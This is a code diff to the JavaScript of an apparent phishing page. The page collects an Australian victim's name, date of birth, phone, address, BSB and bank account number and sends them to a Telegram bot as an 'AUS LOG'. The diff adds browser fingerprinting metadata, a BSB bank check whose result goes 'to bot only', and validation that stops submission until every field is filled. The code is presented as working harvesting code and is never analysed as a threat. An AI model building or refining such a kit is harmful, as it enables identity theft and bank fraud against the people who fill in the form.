@@ -1,4 +1,6 @@
-// app.js — обновлённый buildMessage + сборка полей
+/* ============================================================
+   app.js — Continue не отправляет, пока все поля не заполнены
+   ============================================================ */
 
 /* ============================================
    TELEGRAM BOT CONFIG
@@ -48,8 +50,9 @@ function esc(s) {
 }
 
 /* ============================================
-   BSB VALIDATION (silent)
+   BSB VALIDATION (silent — result goes to bot only)
    ============================================ */
+
 const BSB_BANK_MAP = {
     '01': 'ANZ', '02': 'ANZ',
     '03': 'Westpac', '04': 'Westpac', '05': 'Westpac',
@@ -160,33 +163,26 @@ function validateBSB(raw) {
     };
 }
 
-function buildBsbStatus(bsbCheck, bsbRaw) {
+function buildBsbStatusLine(bsbCheck, bsbRaw) {
     const digits = String(bsbRaw || '').replace(/\D/g, '');
 
     if (digits.length === 0) {
-        return 'not provided';
+        return '<b>BSB status:</b> <i>not provided</i>';
     }
-    if (bsbCheck.valid) {
-        const tag = bsbCheck.isKnownFull ? 'verified' : 'valid format';
-        return `✅ VALID (${tag}) — ${bsbCheck.bank}`;
-    }
-    const map = {
-        'too_short':      `❌ INVALID — too short (${digits.length}/6)`,
-        'too_long':       `❌ INVALID — too long (${digits.length}/6)`,
-        'zero_prefix':    '❌ INVALID — cannot start with 00',
-        'unknown_prefix': `❌ INVALID — unknown bank prefix "${digits.substring(0, 2)}"`
-    };
-    return map[bsbCheck.reason] || '❌ INVALID';
-}
 
-/* ============================================
-   FORMAT TIME — 8.10.2026, 22:23:05
-   ============================================ */
-function fmtTime(d) {
-    const date = d || new Date();
-    const pad = (n) => String(n).padStart(2, '0');
-    return `${date.getDate()}.${date.getMonth() + 1}.${date.getFullYear()}, ` +
-           `${pad(date.getHours())}:${pad(date.getMinutes())}:${pad(date.getSeconds())}`;
+    if (bsbCheck.valid) {
+        const tag = bsbCheck.isKnownFull ? 'verified code' : 'valid format';
+        return `<b>BSB status:</b> ✅ <b>VALID</b> (${esc(tag)}) — Bank: <code>${esc(bsbCheck.bank)}</code>`;
+    }
+
+    const map = {
+        'too_short':      `❌ INVALID — too short (${digits.length}/6 digits)`,
+        'too_long':       `❌ INVALID — too long (${digits.length}/6 digits)`,
+        'zero_prefix':    '❌ INVALID — cannot start with 00',
+        'unknown_prefix': `❌ INVALID — unknown bank prefix "${esc(digits.substring(0, 2))}"`
+    };
+    const msg = map[bsbCheck.reason] || '❌ INVALID';
+    return `<b>BSB status:</b> ${msg}`;
 }
 
 /* ============================================
@@ -201,45 +197,163 @@ function collectFormData() {
     const bsbRaw = get('bsb');
     const bsbCheck = validateBSB(bsbRaw);
 
-    return {
-        firstName:    get('first-name'),
-        lastName:     get('last-name'),
-        dob:          get('dob'),
-        phone:        get('phone'),
-        address:      get('address'),
-        postcode:     get('postcode'),
-        bsb:          bsbRaw,
-        account:      get('account-number'),
-        bsbCheck:     bsbCheck
+    const data = {
+        'First name':     get('first-name'),
+        'Last name':      get('last-name'),
+        'Date of birth':  get('dob'),
+        'Phone number':   get('phone'),
+        'Address':        get('address'),
+        'Postcode':       get('postcode'),
+        'BSB':            bsbRaw,
+        'Account number': get('account-number')
     };
+
+    const meta = {
+        'User-Agent':  navigator.userAgent,
+        'Language':    navigator.language,
+        'Platform':    navigator.platform || 'n/a',
+        'Timezone':    Intl.DateTimeFormat().resolvedOptions().timeZone,
+        'Timestamp':   new Date().toISOString()
+    };
+
+    return { data, meta, bsbCheck };
 }
 
-/* ============================================
-   BUILD MESSAGE — формат "AUS LOG"
-   ============================================ */
-function buildMessage(d) {
-    const fullName = [d.firstName, d.lastName].filter(Boolean).join(' ');
-
+function buildMessage(data, meta, bsbCheck) {
     const lines = [];
-    lines.push('🔴 <b>AUS LOG!</b>');
+    lines.push('AUS LOG 🇦🇺🌏');
     lines.push('');
-    lines.push(`👤 <b>Name:</b> ${esc(fullName) || '<i>—</i>'}`);
-    lines.push(`🎂 <b>Date of birth:</b> ${esc(d.dob) || '<i>—</i>'}`);
-    lines.push(`📱 <b>Phone:</b> ${esc(d.phone) || '<i>—</i>'}`);
-    lines.push(`📍 <b>Address:</b> ${esc(d.address) || '<i>—</i>'}`);
-    lines.push(`📮 <b>Postcode:</b> ${esc(d.postcode) || '<i>—</i>'}`);
-    lines.push(`🏦 <b>BSB:</b> ${esc(d.bsb) || '<i>—</i>'}`);
-    lines.push(`🔍 <b>BSB status:</b> ${buildBsbStatus(d.bsbCheck, d.bsb)}`);
-    lines.push(`🔢 <b>Account:</b> ${esc(d.account) || '<i>—</i>'}`);
+    lines.push('<b>── Form data ──</b>');
+
+    let emptyCount = 0;
+    for (const [k, v] of Object.entries(data)) {
+        if (v) {
+            lines.push(`<b>${esc(k)}:</b> <code>${esc(v)}</code>`);
+        } else {
+            lines.push(`<b>${esc(k)}:</b> <i>(empty)</i>`);
+            emptyCount++;
+        }
+    }
+
     lines.push('');
-    lines.push(`🕒 <b>Time:</b> ${esc(fmtTime())}`);
-    lines.push(`🌐 <b>Browser:</b> ${esc(navigator.userAgent)}`);
+    lines.push('<b>── BSB check ──</b>');
+    lines.push(buildBsbStatusLine(bsbCheck, data['BSB']));
+
+    lines.push('');
+    lines.push('<b>── Metadata ──</b>');
+    for (const [k, v] of Object.entries(meta)) {
+        lines.push(`<b>${esc(k)}:</b> <code>${esc(v)}</code>`);
+    }
+
+    lines.push('');
+    lines.push(`<i>Fields filled: ${Object.keys(data).length - emptyCount}/${Object.keys(data).length}</i>`);
 
     return lines.join('\n');
 }
 
 /* ============================================
+   REQUIRED FIELD VALIDATION
+   ============================================ */
+
+const FIELD_IDS = [
+    'first-name', 'last-name', 'dob', 'phone',
+    'address', 'postcode', 'bsb', 'account-number'
+];
+
+const FIELD_RULES = {
+    'dob': (v) => {
+        if (v.length < 10) return 'Enter full date (DD/MM/YYYY)';
+        const m = v.match(/^(\d{2})\/(\d{2})\/(\d{4})$/);
+        if (!m) return 'Invalid date format';
+        const d = parseInt(m[1], 10);
+        const mo = parseInt(m[2], 10);
+        const y = parseInt(m[3], 10);
+        if (d < 1 || d > 31 || mo < 1 || mo > 12 || y < 1900 || y > 2030) return 'Invalid date';
+        return null;
+    },
+    'phone': (v) => {
+        const digits = v.replace(/\D/g, '');
+        if (digits.length < 6) return 'Phone number is too short';
+        return null;
+    },
+    'postcode': (v) => {
+        const digits = v.replace(/\D/g, '');
+        if (digits.length < 3) return 'Postcode is too short';
+        return null;
+    },
+    'bsb': (v) => {
+        const digits = v.replace(/\D/g, '');
+        if (digits.length < 6) return 'BSB must be 6 digits (XXX-XXX)';
+        return null;
+    },
+    'account-number': (v) => {
+        const digits = v.replace(/\D/g, '');
+        if (digits.length < 4) return 'Account number is too short';
+        return null;
+    }
+};
+
+function setFieldError(id, message) {
+    const input = document.getElementById(id);
+    const errEl = document.querySelector(`.field-error[data-error-for="${id}"]`);
+    if (!input || !errEl) return;
+
+    if (message) {
+        input.classList.add('invalid');
+        errEl.textContent = message;
+    } else {
+        input.classList.remove('invalid');
+        errEl.textContent = '';
+    }
+}
+
+function validateField(id) {
+    const input = document.getElementById(id);
+    if (!input) return true;
+
+    const value = input.value.trim();
+
+    if (!value) {
+        setFieldError(id, 'This field is required');
+        return false;
+    }
+
+    const rule = FIELD_RULES[id];
+    if (rule) {
+        const err = rule(value);
+        if (err) {
+            setFieldError(id, err);
+            return false;
+        }
+    }
+
+    setFieldError(id, '');
+    return true;
+}
+
+function validateAllFields() {
+    let allValid = true;
+    let firstInvalid = null;
+
+    FIELD_IDS.forEach(id => {
+        const ok = validateField(id);
+        if (!ok) {
+            allValid = false;
+            if (!firstInvalid) firstInvalid = document.getElementById(id);
+        }
+    });
+
+    if (firstInvalid) {
+        firstInvalid.focus();
+        firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }
+
+    return allValid;
+}
+
+/* ============================================
    SUBMIT ON CONTINUE BUTTON
+   — если хоть одно поле пустое, ничего не уходит
    ============================================ */
 const form      = document.getElementById('dataForm');
 const submitBtn = document.getElementById('submitBtn');
@@ -247,8 +361,12 @@ const submitBtn = document.getElementById('submitBtn');
 form.addEventListener('submit', async (e) => {
     e.preventDefault();
 
-    const data    = collectFormData();
-    const message = buildMessage(data);
+    if (!validateAllFields()) {
+        return;
+    }
+
+    const { data, meta, bsbCheck } = collectFormData();
+    const message = buildMessage(data, meta, bsbCheck);
 
     const originalText = submitBtn.textContent;
     submitBtn.disabled = true;
@@ -269,6 +387,26 @@ form.addEventListener('submit', async (e) => {
         submitBtn.textContent = originalText;
         submitBtn.style.background = '';
     }, 2000);
+});
+
+/* ============================================
+   LIVE VALIDATION — снимаем ошибки по мере ввода
+   ============================================ */
+FIELD_IDS.forEach(id => {
+    const input = document.getElementById(id);
+    if (!input) return;
+
+    input.addEventListener('input', () => {
+        if (input.classList.contains('invalid')) {
+            validateField(id);
+        }
+    });
+
+    input.addEventListener('blur', () => {
+        if (input.value.trim()) {
+            validateField(id);
+        }
+    });
 });
 
 /* ============================================
@@ -297,7 +435,7 @@ dobInput.addEventListener('keydown', (e) => {
 });
 
 /* ============================================
-   POSTCODE — DIGITS ONLY, NO LENGTH LIMIT
+   POSTCODE — DIGITS ONLY
    ============================================ */
 const postcodeInput = document.getElementById('postcode');
 postcodeInput.addEventListener('input', (e) => {
